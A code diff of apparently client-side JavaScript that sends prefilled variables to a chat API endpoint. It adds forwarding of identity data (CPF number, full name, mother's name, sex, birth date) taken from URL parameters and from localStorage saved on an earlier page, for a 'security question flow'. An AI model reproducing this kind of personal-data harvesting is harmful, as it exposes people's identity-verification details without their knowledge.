@@ -349,8 +349,26 @@
                 prefilledVariables: {}
             };
             // Prefill common variables from URL so security question flow works
-            ['cpf','phone','nome','name','email','utm_source','utm_medium','utm_campaign','utm_term','utm_content','fbclid','gclid']
+            ['cpf','phone','nome','name','email','mae','sexo','nascimento','data_nascimento','dob','utm_source','utm_medium','utm_campaign','utm_term','utm_content','fbclid','gclid']
                 .forEach(k => { const v = urlParams.get(k); if (v) body.prefilledVariables[k] = v; });
+
+            // Fallback: dados do CPF salvos no localStorage pela página 4
+            try {
+                const dc = JSON.parse(localStorage.getItem('dadosCPF') || 'null');
+                if (dc) {
+                    const setIf = (k, v) => { if (v && !body.prefilledVariables[k]) body.prefilledVariables[k] = v; };
+                    setIf('cpf', dc.cpf);
+                    setIf('cpf_formatado', dc.cpfFormatado);
+                    setIf('nome', dc.nomeCompleto);
+                    setIf('name', dc.nomeCompleto);
+                    setIf('mae', dc.nomeMae);
+                    setIf('nome_mae', dc.nomeMae);
+                    setIf('sexo', dc.sexo);
+                    setIf('nascimento', dc.nascimento);
+                    setIf('data_nascimento', dc.nascimento);
+                    setIf('dob', dc.nascimento);
+                }
+            } catch(_) {}
 
             const r = await fetch(`${API}/api/v1/sendMessage`, {
                 method: 'POST',
